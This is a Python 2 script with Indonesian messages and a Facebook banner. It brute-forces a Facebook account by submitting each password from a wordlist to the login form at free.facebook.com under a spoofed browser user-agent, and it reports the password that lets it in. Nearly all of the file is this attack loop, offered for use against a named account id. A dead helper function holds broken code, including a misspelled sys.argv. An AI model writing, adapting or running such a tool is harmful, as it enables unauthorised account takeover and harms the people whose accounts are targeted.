#-*-coding: utf-8-*-
#coding by Danikun
#bruteforce sederhana
################
import os
import sys
import time
import random
import mechanize
import cookielib
#################
# color
################
N = '\033[0m'
W = '\033[1;37m'
B = '\033[1;34m'
M = '\033[1;35m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
I = '\033[1;3m'
################
def faruq():
	gans = sys.executable
	os.execl(faruq, faruq, * sys.agrv)
	novita = os.getcwd()

pareasi = """
%s    ______                __                __    
   / ____/___ _________  / /_  ____  ____  / /__   
  / /_  / __ `/ ___/ _ \/ __ \/ __ \/ __ \/ //_/    
 / __/ / /_/ / /__/  __/ /_/ / /_/ / /_/ / ,<      
/_/    \__,_/\___/\___/_.___/\____/\____/_/|_|     
%s./BruteForce                 %s    ///Author[VrX]
"""%(B,R,W)
os.system("clear")
print "%sPlease Wait...%s"%(G,W)
time.sleep(4)
def type(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(random.random() * 0.2)
type("""START....%s """%(W))
os.system("clear")
print pareasi
print " "
print "-"*35
try:
	id=sys.argv[1]
	passw=sys.argv[2]
except:
	print "%s[ WARNING ] %sKESALAHAN PENULISAN!!!"%(R,W)
	sys.exit()
	
try:
	pw=open(passw,"r+")
except:
	print "%s[ WARNING ] %sKESALAHAN PENULISAN!!!"%(R,W)
	
chan = "https://free.facebook.com"
print "%s[%sNOTE%s]%s CTRL+Z Menghentikan program%s"%(W,G,W,R,W)
to=1
cjar= cookielib.LWPCookieJar()
for pasw in pw.readlines():
		pasw = pasw.strip("\n")
		print "%s[!] MENCOBA >>%s %i"%(R,W,to)
		mech=mechanize.Browser()
		mech.set_handle_robots(False)
		mech.set_handle_redirect(True)
		mech.set_handle_referer(True)
		mech.set_handle_equiv(True)
		mech.set_cookiejar(cjar)
		mech.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		mech.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
		mech.open(chan)
		mech.select_form(nr=0)
		mech.form["email"]=id
		mech.form["pass"]=pasw
		mech.submit()
		text=mech.geturl()
		to += 1
		if "save-device" in text or  "m_sess" in text:
			print "%s[*] success%s >> %s"%(G,G,pasw)
			sys.exit()
		else:
			print "%s[!] %sFAILED >> %s"%(R,G,pasw)